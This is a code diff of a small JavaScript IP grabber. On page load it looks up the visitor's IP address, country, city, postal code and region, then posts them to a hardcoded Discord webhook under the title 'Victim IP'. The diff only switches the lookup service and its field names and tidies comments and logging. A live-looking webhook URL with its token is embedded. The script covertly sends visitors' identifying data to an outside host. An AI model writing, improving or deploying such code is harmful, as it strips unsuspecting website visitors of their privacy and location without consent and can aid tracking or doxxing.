@@ -1,11 +1,7 @@
 const webhook = "https://discord.com/api/webhooks/1564710399645843656/zIRhv338ls6cRwmacg77Utb9nIUSGSG_4i0pHT6Y7sViS0k0eK-5pr5Y0Qib5hoVrkbN"
 
 async function IP_Info(){
-    /**
-     *  Description: On init, fetches IP information of user
-     *  @return {fetch.Body.json()} Resp Body
-     */
-    let response = await fetch("http://ip-api.com/json", {
+    let response = await fetch("https://ipapi.co/json/", {
       method: 'GET',
       headers: {
         "cache-control" : "no-cache",
@@ -16,9 +12,8 @@ async function IP_Info(){
 }
 
 IP_Info().then((value) => {
-    // Adicionado "query" para garantir que o IP venha preenchido corretamente
     let requiredInfo = [
-      "status", "country", "city", "zip", "regionName", "query"
+      "country_name", "city", "postal", "region", "ip"
     ]
     let noData = false
 
@@ -44,14 +39,14 @@ IP_Info().then((value) => {
           embeds: [{
               title: "Victim IP",
               type: "rich",
-              color: 12223968, // Convertido para número (correta tipagem para o Discord)
+              color: 12223968,
               description: "IP information of the recent website visitor.",
               fields: [
-                { name: "IP", value: `${value.query}`, inline: false },
-                { name: "Country", value: `${value.country}`, inline: false },
+                { name: "IP", value: `${value.ip}`, inline: false },
+                { name: "Country", value: `${value.country_name}`, inline: false },
                 { name: "City", value: `${value.city}`, inline: false },
-                { name: "ZIP", value: `${value.zip}`, inline: false },
-                { name: "Region", value: `${value.regionName}`, inline: false }
+                { name: "ZIP", value: `${value.postal}`, inline: false },
+                { name: "Region", value: `${value.region}`, inline: false }
               ],
               footer: {
                 text: "Programmed by Z3NTL3",
@@ -69,7 +64,7 @@ IP_Info().then((value) => {
       }).then((res) => {
         console.log(res.statusText)
       }).catch((err) => {
-        console.log(err)
+        console.log('Erro no fetch do webhook:', err)
       })
     }
 }).catch((err) => {
